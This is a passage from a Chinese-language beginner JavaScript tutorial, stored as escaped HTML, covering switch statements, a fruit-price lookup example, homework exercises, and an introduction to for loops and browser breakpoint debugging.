&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    } 
    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 我们开发里面，表达式我们经常写成变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 我们 num 的值 和 case 里面的值相匹配的时候是 全等，必须是值和数据类型一致才可以 num == 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. break 如果当前的case里面没有break，则不会退出switch，是继续执行下一个case
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例查询水果&#34;&gt;案例：查询水果&lt;/h4&gt;
&lt;p&gt;用户在输入框里面输入一个水果，如果有就弹出该水果的价格，如果没有该水果就弹出“没有此水果”&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;弹出prompt输入框，让用户输入水果名称，把这个值取过来保存到变量中&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将这个变量作为switch括号里面的表达式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;case后面的值写几个不同的水果名称，注意一定要加引号，因为必须是全等匹配&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;弹出不同价格即可。同样注意每个case之后加上break，以便退出switch语句&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将default设置为没有此水果&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 弹出prompt输入框，让用户输入水果名称，把这个值取过来保存到变量中
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 将这个变量作为switch括号里面的表达式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. case后面的值写几个不同的水果名称，注意一定要加引号，因为必须是全等匹配
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 弹出不同价格即可。同样注意每个case之后加上break，以便退出switch语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5. 将default设置为没有此水果
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fruit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入你查询的水果：&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;fruit&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;苹果&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;苹果的价格是 3.5/斤&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;榴莲&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;榴莲的价格是 35/斤&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;没有此水果&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;652-switch-语句和-if-else-if-语句的区别&#34;&gt;6.5.2 switch 语句和 if else if 语句的区别&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;一般情况下，它们两个语句是可以相互替换的&lt;/li&gt;
&lt;li&gt;&lt;code&gt;switch...case...&lt;/code&gt; 语句通常处理 &lt;code&gt;case&lt;/code&gt; 为比较确定值的情况，而 &lt;code&gt;if...else...&lt;/code&gt;语句更加灵活，常用于范围判断（大于等于某个范围）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;switch...case...&lt;/code&gt; 语句进行条件判断后直接执行到程序的条件语句，效率更高。而 &lt;code&gt;if...else...&lt;/code&gt; 语句有几种条件，就得判断多少次&lt;/li&gt;
&lt;li&gt;当分支比较少时，&lt;code&gt;if...else...&lt;/code&gt; 语句的执行效率比 &lt;code&gt;switch...case...&lt;/code&gt; 语句高&lt;/li&gt;
&lt;li&gt;当分支比较多时，&lt;code&gt;switch...case...&lt;/code&gt; 语句的执行效率比较高，而且结构更清晰&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;653-作业&#34;&gt;6.5.3 作业&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;判断时间阶段，比如用户输入12点弹出中午好，输入18点弹出傍晚好，用户输入23点弹出深夜好&lt;/li&gt;
&lt;li&gt;比较两个数的最大值（用户依次输入2哥值，最后弹出最大的那个值）&lt;/li&gt;
&lt;li&gt;用户输入一个数，来判断是奇数还是偶数&lt;/li&gt;
&lt;li&gt;根据用户输入的数值（1~7），返回星期几&lt;/li&gt;
&lt;li&gt;接收班长口袋里的钱数？若大于等于2000，请大家吃西餐。若小于2000，大于等于1500，请大家吃快餐。若小于1500，大于等于1000，请大家喝饮料。若小于1000，大于等于500，请大家吃棒棒糖。否则提醒班长下次把钱带够。&lt;/li&gt;
&lt;li&gt;分数转换，给一个分数，判定等级。大于等于90A，大于等于80小于90B，大于等于70小于80C，大于等于60小于70D，小于60E。&lt;/li&gt;
&lt;li&gt;预习下，循环控制for循环。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;7-javascript-流程控制---循环&#34;&gt;7. JavaScript 流程控制 - 循环&lt;/h1&gt;
&lt;h2 id=&#34;本节目标-5&#34;&gt;本节目标&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;能够说出循环的目的&lt;/li&gt;
&lt;li&gt;能够说出for循环的执行过程&lt;/li&gt;
&lt;li&gt;能够使用断点调试来观察代码的执行过程&lt;/li&gt;
&lt;li&gt;能够使用for循环完成累加求和等案例&lt;/li&gt;
&lt;li&gt;能够使用双重for循环完成乘法表案例&lt;/li&gt;
&lt;li&gt;能够说出while循环和do while循环的区别&lt;/li&gt;
&lt;li&gt;能够说出break和continue的区别&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;本节目录-4&#34;&gt;本节目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;循环&lt;/li&gt;
&lt;li&gt;for循环&lt;/li&gt;
&lt;li&gt;双重for循环&lt;/li&gt;
&lt;li&gt;while循环&lt;/li&gt;
&lt;li&gt;do while 循环&lt;/li&gt;
&lt;li&gt;continue break&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;71-循环&#34;&gt;7.1 循环&lt;/h2&gt;
&lt;h3 id=&#34;循环目的&#34;&gt;循环目的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在实际问题中，有许多具有&lt;strong&gt;规律性的重复操作&lt;/strong&gt;，因此在程序中要完成这类操作就需要&lt;strong&gt;重复执行某些语句&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 循环的目的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;媳妇儿我错了&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;媳妇儿我错了&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;媳妇儿我错了&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;------------------------------&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;媳妇儿我错了&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;713-js-中的循环&#34;&gt;7.1.3 JS 中的循环&lt;/h3&gt;
&lt;p&gt;在JS中，主要有三种类型的循环语句：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;for&lt;/code&gt; 循环&lt;/li&gt;
&lt;li&gt;&lt;code&gt;while&lt;/code&gt; 循环&lt;/li&gt;
&lt;li&gt;&lt;code&gt;do...while...&lt;/code&gt; 循环&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;72-for-循环&#34;&gt;7.2 for 循环&lt;/h2&gt;
&lt;p&gt;在程序中，一组被重复执行的语句被称之为&lt;strong&gt;循环体&lt;/strong&gt;，能否继续重复执行，取决于循环的&lt;strong&gt;终止条件&lt;/strong&gt;。由循环体即循环的终止条件组成的语句，被称之为&lt;strong&gt;循环语句&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;721-语法结构&#34;&gt;7.2.1 语法结构&lt;/h3&gt;
&lt;p&gt;for 循环主要用于把某些代码循环若干次，通常跟计数有关系。其语法结构如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;初始化变量&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;操作表达式&lt;/span&gt;) {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 循环体
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. for 重复执行某些代码，通常跟计数有关系
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. for 语法结构
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;初始化变量&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;操作表达式&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 循环体
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 初始化变量：就是用var声明的一个普通变量，通常用于作为计数器使用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 条件表达式：就是用来决定每一次循环是否继续执行，就是终止的条件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5. 操作表达式：是每次循环最后执行的代码，经常用于我们计数器变量进行更新（递增或者递减）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 6. 代码体验，我们重复打印100句，你好
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你好&amp;#39;&lt;/span&gt;);
    }
    
    &lt;span style=&#34;color:#75715e&#34;&gt;// for循环的执行过程
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 首先执行里面的计数器变量 var i = 1，但是这句话在for里面只执行一次 index
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 去 i &amp;lt;= 100 来判断是否满足条件，如果满足条件就去执行循环体，不满足条件退出循环
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 最后去执行i++，i++是单独写的代码，递增，第一轮结束
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 接着去执行 i &amp;lt;= 100，如果满足条件，就去执行循环体，不满足条件退出循环，第二轮
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;断点调试&#34;&gt;断点调试：&lt;/h4&gt;
&lt;p&gt;断点调试是指自己在程序的某一行设置一个断点，调试时，程序运行到这一行就会停住，然后你可以一步一步往下调试，调试过程中可以看各个变量当前的指，出错的话，调试到出错的代码行即显示错误，停下。&lt;/p&gt;
&lt;p&gt;断点调试可以帮我们观察程序的运行过程。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;浏览器中按 F12 &amp;mdash;&amp;gt; sources &amp;ndash;&amp;gt; 找到需要调试的文件 &amp;ndash;&amp;gt; 在程序的某一行设置断点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Watch：监视，通过watch可以监视变量的值的变化，非常的常用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;F11：程序单步执行，让程序一行一行的执行，这个时候，观察watch中变量的值的变化。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代码调试的能力非常重要，只有学会了代码调试，才能学会自己解决bug的能力。初学者不要觉得调试代码麻烦就不去调试，知识点花点功夫肯定学的会，但是代码调试这个东西，自己不去练，永远都学不会。&lt;/p&gt;
&lt;p&gt;今天学的代码调试非常的简单，只要求同学们记住代码调试的这几个按钮的作用即可，后面还会学到很多的代码调试技巧。&lt;/p&gt;
&lt;h3 id=&#34;722-for-循环重复相同的代码&#34;&gt;7.2.2 for 循环重复相同的代码&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// for 循环可以执行相同的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;媳妇儿我错了&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 我们可以让用户控制输出的次数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请你输入次数&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;媳妇儿我错了&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;723-for-循环重复不相同的代码&#34;&gt;7.2.3 for 循环重复不相同的代码&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;for 循环还可以重复不同的代码，这主要是因为使用了计数器，计数器在每次循环过程中都会有变化。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// for 循环可以重复执行不同的代码，因为我们有计数器变量i的存在，i每次循环值都会变化
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 我们想要输出1哥人 1~100岁
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这个人今年&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁了&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这个人今年1岁了，他出生了&amp;#39;&lt;/span&gt;);
        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这个人今年100岁了，他死了&amp;#39;&lt;/span&gt;);
        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这个人今年&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁了&amp;#39;&lt;/span&gt;)
        }
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;724-for-循环重复某些相同操作&#34;&gt;7.2.4 for 循环重复某些相同操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;for 循环因为有了计数器的存在，我们还可以重复的执行某些操作，比如做一些算数运算。&lt;/li&gt;
&lt;/ul&gt;
